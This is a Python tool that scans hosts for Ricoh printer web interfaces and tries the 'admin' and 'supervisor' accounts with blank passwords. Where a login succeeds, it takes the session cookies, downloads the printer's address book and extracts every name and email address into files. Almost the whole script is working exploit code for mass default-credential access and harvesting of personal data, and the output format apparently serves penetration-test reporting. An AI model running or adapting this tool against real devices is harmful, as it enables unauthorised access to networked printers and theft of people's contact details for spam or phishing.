#!/usr/bin/env python3
import argparse
import ast
import concurrent.futures
import json
import os
import re
import sys
from typing import List, Tuple
from urllib.parse import urlparse

import requests
from requests.exceptions import RequestException


def parse_hosts_file(path: str) -> List[str]:
    hosts: List[str] = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            hosts.append(stripped)
    return hosts


def build_target(base: str, default_scheme: str) -> Tuple[str, str, str]:
    """
    Returns (scheme, hostport, base_url) for the given base entry.
    base can be a hostname, ip, host:port, or full URL.
    """
    parsed = urlparse(base if "://" in base else f"{default_scheme}://{base}")
    scheme = parsed.scheme or default_scheme
    hostport = parsed.netloc or parsed.path
    base_url = f"{scheme}://{hostport}"
    return scheme, hostport, base_url


def check_if_ricoh_printer(
    base: str,
    default_scheme: str,
    timeout_seconds: int,
    verify_tls: bool,
    verbose: bool = False,
) -> Tuple[str, bool, str]:
    """
    Check if the target is a Ricoh printer by accessing the main frame page.
    Returns tuple: (host_display, is_ricoh, reason)
    """
    scheme, hostport, base_url = build_target(base, default_scheme)
    
    url = f"{base_url}/web/guest/en/websys/webArch/mainFrame.cgi"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
    }
    
    if verbose:
        print(f"\n{'='*80}")
        print(f"[RICOH CHECK] {hostport}")
        print(f"{'='*80}")
        print(f"GET {url}")
        print(f"{'='*80}")
    
    try:
        resp = requests.get(
            url,
            headers=headers,
            timeout=timeout_seconds,
            verify=verify_tls,
            allow_redirects=True,
        )
        
        status = resp.status_code
        text = resp.text or ""
        
        if verbose:
            print(f"\n{'='*80}")
            print(f"[RICOH CHECK RESPONSE] {hostport}")
            print(f"{'='*80}")
            print(f"Status: {status}")
            print(f"Response Body ({len(text)} bytes):")
            print(f"{text[:500]}")
            if len(text) > 500:
                print(f"... (truncated)")
            print(f"{'='*80}\n")
        
        # Check if this looks like a Ricoh printer
        # Look for Ricoh-specific content in the response
        if status == 200:
            # Check for common Ricoh printer indicators
            ricoh_indicators = [
                "RICOH",
                "Web Image Monitor",
                "websys/webArch",
                "rimNote",
                "rimLocal",
                "/web/guest/",
            ]
            
            text_upper = text.upper()
            found_indicators = []
            for indicator in ricoh_indicators:
                if indicator.upper() in text_upper:
                    found_indicators.append(indicator)
            
            if found_indicators:
                reason = f"Ricoh printer detected (found: {', '.join(found_indicators[:3])})"
                return hostport, True, reason
            else:
                reason = "Not a Ricoh printer (no Ricoh indicators found in response)"
                return hostport, False, reason
        elif status == 302 or status == 301:
            # Redirect might indicate need for authentication - likely a Ricoh printer
            location = resp.headers.get('Location', '')
            if 'authForm.cgi' in location or 'login' in location.lower():
                reason = "Ricoh printer detected (redirect to auth page)"
                return hostport, True, reason
            else:
                reason = f"Unexpected redirect to: {location}"
                return hostport, False, reason
        elif status == 404:
            reason = f"Not a Ricoh printer (HTTP {status} - page not found)"
            return hostport, False, reason
        else:
            reason = f"Unexpected response (HTTP {status})"
            return hostport, False, reason
            
    except RequestException as exc:
        reason = f"Connection error: {exc.__class__.__name__}"
        return hostport, False, reason


def attempt_login(
    base: str,
    default_scheme: str,
    timeout_seconds: int,
    verify_tls: bool,
    return_session: bool = False,
    verbose: bool = False,
    username: str = "admin",
) -> Tuple[str, str, int, dict, str]:
    """
    Returns tuple: (host_display, result, status_code, session_data, username)
    result is one of: SUCCESS, FAIL, ERROR:<msg>
    session_data contains: {'cookies': {}, 'base_url': ''}
    username: the username that was used for the login attempt
    """
    import base64
    
    scheme, hostport, base_url = build_target(base, default_scheme)

    url = f"{base_url}/web/guest/en/websys/webArch/login.cgi"
    referer = f"{base_url}/web/guest/en/websys/webArch/authForm.cgi"

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Referer": referer,
        "Upgrade-Insecure-Requests": "1",
    }

    # Default cookies from the provided request
    cookies = {
        "risessionid": "012450409054315",
        "cookieOnOffChecker": "on",
        "wimsesid": "--",
    }

    # Encode username to base64
    userid_encoded = base64.b64encode(username.encode('utf-8')).decode('utf-8')

    # Form body from the provided request
    data = {
        "wimToken": "1615404968",
        "userid_work": "",
        "userid": userid_encoded,
        "password_work": "",
        "password": "",
        "open": "",
    }

    session_data = {}

    if verbose:
        print(f"\n{'='*80}")
        print(f"[LOGIN REQUEST] {hostport} (username: {username})")
        print(f"{'='*80}")
        print(f"POST {url}")
        print(f"\nHeaders:")
        for k, v in headers.items():
            print(f"  {k}: {v}")
        print(f"\nCookies:")
        for k, v in cookies.items():
            print(f"  {k}: {v}")
        print(f"\nForm Data:")
        for k, v in data.items():
            print(f"  {k}: {v}")
        print(f"{'='*80}")

    try:
        # Don't follow redirects - we want to see the 302 response
        resp = requests.post(
            url,
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=timeout_seconds,
            verify=verify_tls,
            allow_redirects=False,
        )
        status = resp.status_code
        text = resp.text or ""
        
        if verbose:
            print(f"\n{'='*80}")
            print(f"[LOGIN RESPONSE] {hostport}")
            print(f"{'='*80}")
            print(f"Status: {status}")
            print(f"\nResponse Headers:")
            for k, v in resp.headers.items():
                print(f"  {k}: {v}")
            print(f"\nSet-Cookie Headers (parsed):")
            for k, v in resp.cookies.items():
                print(f"  {k}: {v}")
            print(f"\nResponse Body ({len(text)} bytes):")
            print(f"{text[:1000]}")
            if len(text) > 1000:
                print(f"... (truncated)")
            print(f"{'='*80}\n")
        
        # Check for authentication failure
        if "Authentication has failed" in text:
            return hostport, "FAIL", status, session_data, username
        
        # Successful login returns 302 redirect to mainFrame.cgi
        if status == 302:
            location = resp.headers.get('Location', '')
            if 'mainFrame.cgi' not in location and 'authForm.cgi' in location:
                # Redirect to login form means failure
                return hostport, "FAIL", status, session_data, username
            # Otherwise, 302 to mainFrame.cgi is success
        elif status == 200:
            # Some versions might return 200, that's OK
            pass
        else:
            # Other status codes are errors
            return hostport, f"ERROR: HTTP {status}", status, session_data, username
        
        # If login successful and session requested, capture session cookies
        if return_session:
            # Parse Set-Cookie header manually to capture both risessionid and wimsesid
            # For 302 responses, the format is cleaner:
            # Set-Cookie: risessionid=066124883298009;HttpOnly
            # Set-Cookie: wimsesid=178962527;path=/;HttpOnly
            all_cookies = {}
            
            # First, get all Set-Cookie headers (there may be multiple)
            set_cookie_headers = resp.headers.get('Set-Cookie', '')
            if set_cookie_headers:
                # Split by comma, but be careful not to split within a single cookie
                # Actually, multiple Set-Cookie headers are concatenated with ', '
                cookie_parts = set_cookie_headers.split(', ')
                
                for part in cookie_parts:
                    # Extract cookie name and value (before the first semicolon)
                    cookie_def = part.strip().split(';')[0].strip()
                    if '=' in cookie_def:
                        name, value = cookie_def.split('=', 1)
                        name = name.strip()
                        value = value.strip()
                        
                        # Only set the cookie if we haven't seen it OR if it's not a reset value
                        if name not in all_cookies:
                            all_cookies[name] = value
                        elif value != '--':
                            # If we see the cookie again and it's not --, prefer the non-reset value
                            all_cookies[name] = value
                
                if verbose:
                    print(f"[DEBUG] {hostport}: Manually parsed Set-Cookie: {all_cookies}")
            
            # If manual parsing didn't work, fall back to response cookies
            if not all_cookies:
                all_cookies = dict(resp.cookies)
            
            # Merge with initial cookies to preserve any we didn't get in the response
            for key, value in cookies.items():
                if key not in all_cookies and value != '--':
                    all_cookies[key] = value
            
            # Ensure cookieOnOffChecker is present
            if 'cookieOnOffChecker' not in all_cookies:
                all_cookies['cookieOnOffChecker'] = 'on'
            
            if verbose:
                print(f"[DEBUG] {hostport}: Final captured cookies for session: {all_cookies}")
            
            session_data = {
                'cookies': all_cookies,
                'base_url': base_url
            }
        
        return hostport, "SUCCESS", status, session_data, username
    except RequestException as exc:
        return hostport, f"ERROR: {exc.__class__.__name__}: {exc}", 0, session_data, username


def export_address_book(
    hostport: str,
    session_data: dict,
    timeout_seconds: int,
    verify_tls: bool,
    output_dir: str = ".",
    verbose: bool = False,
) -> Tuple[str, str]:
    """
    Export the address book from a Ricoh printer using authenticated session.
    Returns tuple: (hostport, result_message)
    """
    if not session_data or 'cookies' not in session_data:
        return hostport, "ERROR: No session data available"
    
    base_url = session_data.get('base_url', '')
    cookies = session_data.get('cookies', {})
    
    # Use the session cookies from the login response
    session_cookies = cookies if cookies else {}
    
    # Ensure required cookies are present
    if 'cookieOnOffChecker' not in session_cookies:
        session_cookies['cookieOnOffChecker'] = 'on'
    
    # STEP 1: First, navigate to the address list page to get a fresh risessionid
    # This is required before we can export the address book
    # IMPORTANT: Only send wimsesid and cookieOnOffChecker, NOT the old risessionid
    adrsList_url = f"{base_url}/web/entry/en/address/adrsList.cgi"
    adrsList_referer = f"{base_url}/web/entry/en/websys/webArch/topPage.cgi"
    
    # Only use wimsesid and cookieOnOffChecker for this request
    adrsList_cookies = {
        'wimsesid': session_cookies.get('wimsesid', ''),
        'cookieOnOffChecker': session_cookies.get('cookieOnOffChecker', 'on')
    }
    
    adrsList_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "frame",
        "Referer": adrsList_referer,
        "Connection": "keep-alive",
    }
    
    if verbose:
        print(f"\n{'='*80}")
        print(f"[ADDRESS LIST REQUEST] {hostport}")
        print(f"{'='*80}")
        print(f"GET {adrsList_url}")
        print(f"\nHeaders:")
        for k, v in adrsList_headers.items():
            print(f"  {k}: {v}")
        print(f"\nCookies:")
        for k, v in adrsList_cookies.items():
            print(f"  {k}: {v}")
        print(f"{'='*80}")
    
    try:
        # Make request to address list page to get fresh risessionid
        adrsList_resp = requests.get(
            adrsList_url,
            headers=adrsList_headers,
            cookies=adrsList_cookies,
            timeout=timeout_seconds,
            verify=verify_tls,
        )
        
        if verbose:
            print(f"\n{'='*80}")
            print(f"[ADDRESS LIST RESPONSE] {hostport}")
            print(f"{'='*80}")
            print(f"Status: {adrsList_resp.status_code}")
            print(f"\nResponse Headers:")
            for k, v in adrsList_resp.headers.items():
                print(f"  {k}: {v}")
            print(f"\nResponse Body ({len(adrsList_resp.text)} bytes):")
            print(f"{adrsList_resp.text[:500]}")
            if len(adrsList_resp.text) > 500:
                print(f"... (truncated)")
            print(f"{'='*80}\n")
        
        if adrsList_resp.status_code != 200:
            return hostport, f"ERROR: Address list request failed with HTTP {adrsList_resp.status_code}"
        
        # Parse the Set-Cookie header to get the new risessionid
        # The server should return a fresh risessionid for the address book section
        set_cookie_header = adrsList_resp.headers.get('Set-Cookie', '')
        new_risessionid = None
        
        if set_cookie_header:
            cookie_parts = set_cookie_header.split(',')
            for part in cookie_parts:
                cookie_def = part.strip().split(';')[0].strip()
                if '=' in cookie_def:
                    name, value = cookie_def.split('=', 1)
                    name = name.strip()
                    value = value.strip()
                    
                    # Capture the FIRST risessionid we see (skip if it doesn't exist or is empty)
                    if name == 'risessionid' and new_risessionid is None and value:
                        new_risessionid = value
                        session_cookies['risessionid'] = value
                    
                    # DON'T update wimsesid if it's the reset value "--"
                    # We want to keep the good wimsesid from login
        
        # Also check the response cookies object for risessionid
        if 'risessionid' in adrsList_resp.cookies:
            if new_risessionid is None:
                new_risessionid = adrsList_resp.cookies['risessionid']
                session_cookies['risessionid'] = new_risessionid
        
        if verbose:
            print(f"[DEBUG] {hostport}: Updated cookies after address list: {session_cookies}")
            if new_risessionid:
                print(f"[DEBUG] {hostport}: Got new risessionid: {new_risessionid}")
        
    except RequestException as exc:
        return hostport, f"ERROR: Address list request failed - {exc.__class__.__name__}: {exc}"
    
    # STEP 2: Now make the actual export request with the updated cookies
    url = f"{base_url}/web/entry/en/address/adrsListLoadEntry.cgi?listCountIn=50&getCountIn=1"
    referer = f"{base_url}/web/entry/en/address/adrsList.cgi"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Accept": "text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    
    if verbose:
        print(f"\n{'='*80}")
        print(f"[EXPORT REQUEST] {hostport}")
        print(f"{'='*80}")
        print(f"GET {url}")
        print(f"\nHeaders:")
        for k, v in headers.items():
            print(f"  {k}: {v}")
        print(f"\nCookies:")
        for k, v in session_cookies.items():
            print(f"  {k}: {v}")
        print(f"{'='*80}")
    
    try:
        resp = requests.get(
            url,
            headers=headers,
            cookies=session_cookies,
            timeout=timeout_seconds,
            verify=verify_tls,
        )
        
        if verbose:
            print(f"\n{'='*80}")
            print(f"[EXPORT RESPONSE] {hostport}")
            print(f"{'='*80}")
            print(f"Status: {resp.status_code}")
            print(f"\nResponse Headers:")
            for k, v in resp.headers.items():
                print(f"  {k}: {v}")
            print(f"\nResponse Body ({len(resp.text)} bytes):")
            print(f"{resp.text[:1000]}")
            if len(resp.text) > 1000:
                print(f"... (truncated)")
            print(f"{'='*80}\n")
        
        if resp.status_code != 200:
            return hostport, f"ERROR: Export failed with HTTP {resp.status_code}"
        
        # Save the address book to a file
        safe_filename = hostport.replace(":", "_").replace("/", "_")
        output_file = f"{output_dir}/addressbook_{safe_filename}.txt"
        
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(resp.text)
        
        return hostport, f"SUCCESS: Exported to {output_file}"
        
    except RequestException as exc:
        return hostport, f"ERROR: Export failed - {exc.__class__.__name__}: {exc}"


def parse_and_extract_emails(output_dir: str = ".", output_file: str = "extracted_emails.txt") -> Tuple[int, str]:
    """
    Parse all addressbook_*.txt files in the output directory and extract emails.
    Returns tuple: (email_count, output_file_path)
    
    Expected addressbook format:
    [[1,1,'00001','Name','','timestamp','email@example.com',''],...]
    Email is at index 6 of each entry.
    """
    import glob
    
    all_emails = set()  # Use set to avoid duplicates
    addressbook_files = glob.glob(f"{output_dir}/addressbook_*.txt")
    
    if not addressbook_files:
        return 0, output_file
    
    for filepath in addressbook_files:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read().strip()
            
            if not content:
                continue
            
            # Try to parse as array (JavaScript/Python format with single quotes)
            try:
                # Use ast.literal_eval to handle single-quoted strings
                data = ast.literal_eval(content)
                
                # If it's a list of lists, iterate through entries
                if isinstance(data, list):
                    for entry in data:
                        if isinstance(entry, list) and len(entry) > 6:
                            email = entry[6]  # Email is at index 6
                            if email and isinstance(email, str) and email.strip():
                                # Basic email validation (contains @ and .)
                                if '@' in email and '.' in email:
                                    all_emails.add(email.strip())
            except (ValueError, SyntaxError):
                # If parsing fails, try regex to extract emails
                # This is a fallback in case the format is slightly different
                email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                emails = re.findall(email_pattern, content)
                for email in emails:
                    all_emails.add(email.strip())
        
        except Exception as e:
            # Continue processing other files if one fails
            print(f"Warning: Failed to process {filepath}: {e}")
            continue
    
    # Write all extracted emails to output file
    output_path = f"{output_dir}/{output_file}"
    with open(output_path, "w", encoding="utf-8") as f:
        for email in sorted(all_emails):
            f.write(f"{email}\n")
    
    return len(all_emails), output_path


def parse_and_extract_names(output_dir: str = ".", output_file: str = "extracted_names.txt") -> Tuple[int, str]:
    """
    Parse all addressbook_*.txt files in the output directory and extract names.
    Returns tuple: (name_count, output_file_path)
    
    Expected addressbook format:
    [[1,1,'00001','Name','','timestamp','email@example.com',''],...]
    Name is at index 3 of each entry.
    """
    import glob
    
    all_names = set()  # Use set to avoid duplicates
    addressbook_files = glob.glob(f"{output_dir}/addressbook_*.txt")
    
    if not addressbook_files:
        return 0, output_file
    
    for filepath in addressbook_files:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read().strip()
            
            if not content:
                continue
            
            # Try to parse as array (JavaScript/Python format with single quotes)
            try:
                # Use ast.literal_eval to handle single-quoted strings
                data = ast.literal_eval(content)
                
                # If it's a list of lists, iterate through entries
                if isinstance(data, list):
                    for entry in data:
                        if isinstance(entry, list) and len(entry) > 3:
                            name = entry[3]  # Name is at index 3
                            if name and isinstance(name, str) and name.strip():
                                all_names.add(name.strip())
            except (ValueError, SyntaxError) as e:
                # If parsing fails, skip this file
                print(f"Warning: Could not parse array from {filepath}: {e}")
                continue
        
        except Exception as e:
            # Continue processing other files if one fails
            print(f"Warning: Failed to process {filepath}: {e}")
            continue
    
    # Write all extracted names to output file
    output_path = f"{output_dir}/{output_file}"
    with open(output_path, "w", encoding="utf-8") as f:
        for name in sorted(all_names):
            f.write(f"{name}\n")
    
    return len(all_names), output_path


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Test Ricoh printers for default credentials and export address books."
        )
    )
    parser.add_argument(
        "hosts_file",
        help="Path to file containing hosts or URLs (one per line)",
    )
    parser.add_argument(
        "--scheme",
        default="https",
        choices=["http", "https"],
        help="Default URL scheme if hosts file lines omit a scheme (default: https)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=10,
        help="Number of concurrent workers (default: 10)",
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify TLS certificates (default: disabled)",
    )
    parser.add_argument(
        "--export",
        action="store_true",
        help="Export address book from printers with successful default credentials",
    )
    parser.add_argument(
        "--output-dir",
        default=".",
        help="Output directory for exported address books (default: current directory)",
    )
    parser.add_argument(
        "--export-timeout",
        type=int,
        default=30,
        help="Timeout in seconds for address book export requests (default: 30)",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output for debugging",
    )
    parser.add_argument(
        "--success-file",
        default="successful_logins.txt",
        help="Output file for successful logins in backtick-delimited format (default: successful_logins.txt)",
    )

    args = parser.parse_args()

    if not args.verify:
        # Suppress only the specific InsecureRequestWarning when verify=False
        try:
            from urllib3.exceptions import InsecureRequestWarning
            import urllib3

            urllib3.disable_warnings(InsecureRequestWarning)
        except Exception:
            pass

    hosts = parse_hosts_file(args.hosts_file)
    if not hosts:
        print("No hosts found in file.")
        return 1

    # Create output directory if export is enabled
    if args.export:
        os.makedirs(args.output_dir, exist_ok=True)

    results: List[Tuple[str, str, int, dict, str]] = []
    successful_logins: List[Tuple[str, str, str, str, str]] = []  # (AssetName, URI, Protocol, Port, Output)
    
    print(f"Step 1: Checking if {len(hosts)} host(s) are Ricoh printers...")
    print(f"Workers: {args.workers}")
    print("-" * 80)
    
    # First, check which hosts are Ricoh printers
    ricoh_hosts = []
    skipped = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
        check_futures = {
            executor.submit(check_if_ricoh_printer, host, args.scheme, args.timeout, args.verify, args.verbose): host
            for host in hosts
        }
        
        for future in concurrent.futures.as_completed(check_futures):
            hostport, is_ricoh, reason = future.result()
            if is_ricoh:
                ricoh_hosts.append(check_futures[future])
                print(f"✓ {hostport}\t{reason}")
            else:
                skipped += 1
                print(f"✗ {hostport}\tSKIPPED: {reason}")
    
    if not ricoh_hosts:
        print("\nNo Ricoh printers found. Exiting.")
        return 1
    
    print(f"\n{'-'*80}")
    print(f"Step 2: Testing credentials on {len(ricoh_hosts)} confirmed Ricoh printer(s)...")
    print(f"Testing usernames: admin, supervisor")
    
    total_tests = len(ricoh_hosts) * 2  # Testing both admin and supervisor per Ricoh host
    completed = 0
    
    print(f"Total credential tests: {total_tests}")
    print("-" * 80)
    
    successes = 0
    failures = 0
    errors = 0
    exported = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = []
        # Test both admin and supervisor accounts for each confirmed Ricoh host
        for host in ricoh_hosts:
            # Test admin account
            futures.append(
                executor.submit(
                    attempt_login, host, args.scheme, args.timeout, args.verify, args.export, args.verbose, "admin"
                )
            )
            # Test supervisor account
            futures.append(
                executor.submit(
                    attempt_login, host, args.scheme, args.timeout, args.verify, False, args.verbose, "supervisor"
                )
            )
        
        # Process results as they complete and show real-time progress
        for fut in concurrent.futures.as_completed(futures):
            result = fut.result()
            results.append(result)
            completed += 1
            
            host, outcome, status_code, session_data, username_used = result
            
            # Print result immediately
            print(f"[{completed}/{total_tests}] {host}\t{username_used}\t{outcome}\tstatus={status_code}")
            
            if outcome == "SUCCESS":
                successes += 1
                
                # Parse protocol and port from the host/session data
                # Get base_url from session_data if available, otherwise reconstruct
                if session_data and 'base_url' in session_data:
                    base_url = session_data['base_url']
                else:
                    scheme, hostport, base_url = build_target(host, args.scheme)
                
                # Parse the base_url to extract protocol and port
                parsed = urlparse(base_url)
                protocol = "tcp"  # Web services use TCP
                
                # Determine port
                if parsed.port:
                    port = str(parsed.port)
                else:
                    # Use default ports based on scheme
                    port = "443" if parsed.scheme == "https" else "80"
                
                # Create output message
                output_msg = f"Successful login with username '{username_used}' and blank password (HTTP {status_code})"
                
                # Add to successful logins list
                # Format: AssetName, URI, Protocol, Port, Output
                asset_name = parsed.netloc or host  # Use netloc (host:port) or original host
                uri = parsed.netloc or host
                successful_logins.append((asset_name, uri, protocol, port, output_msg))
                
                # Export address book only if admin account succeeded and export flag is set
                # Supervisor account cannot export address books
                if args.export and session_data and username_used == "admin":
                    export_host, export_result = export_address_book(
                        host, session_data, args.export_timeout, args.verify, args.output_dir, args.verbose
                    )
                    print(f"[{completed}/{total_tests}] {export_host}\tEXPORT: {export_result}")
                    if "SUCCESS" in export_result:
                        exported += 1
            elif outcome == "FAIL":
                failures += 1
            else:
                errors += 1

    summary = f"\nTotal Hosts: {len(hosts)}\tRicoh Printers: {len(ricoh_hosts)}\tSkipped: {skipped}"
    summary += f"\nCredential Tests: {len(results)}\tSUCCESS: {successes}\tFAIL: {failures}\tERROR: {errors}"
    if args.export:
        summary += f"\tEXPORTED: {exported}"
    print(summary)
    
    # Write successful logins to backtick-delimited file
    if successful_logins:
        with open(args.success_file, "w", encoding="utf-8") as f:
            # Write header comment
            f.write("# Format: AssetName`URI`Protocol`Port`Output\n")
            # Write each successful login
            for asset_name, uri, protocol, port, output_msg in successful_logins:
                f.write(f"{asset_name}`{uri}`{protocol}`{port}`{output_msg}\n")
        
        print(f"\nSuccessful logins saved to: {args.success_file} ({len(successful_logins)} entry/entries)")
    
    # Extract emails and names from all exported address books
    if args.export and exported > 0:
        print("\nExtracting emails from address books...")
        email_count, email_file = parse_and_extract_emails(args.output_dir, "extracted_emails.txt")
        print(f"Extracted {email_count} unique email(s) to {email_file}")
        
        print("\nExtracting names from address books...")
        name_count, name_file = parse_and_extract_names(args.output_dir, "extracted_names.txt")
        print(f"Extracted {name_count} unique name(s) to {name_file}")
    
    return 0 if successes or failures else 1


if __name__ == "__main__":
    sys.exit(main())


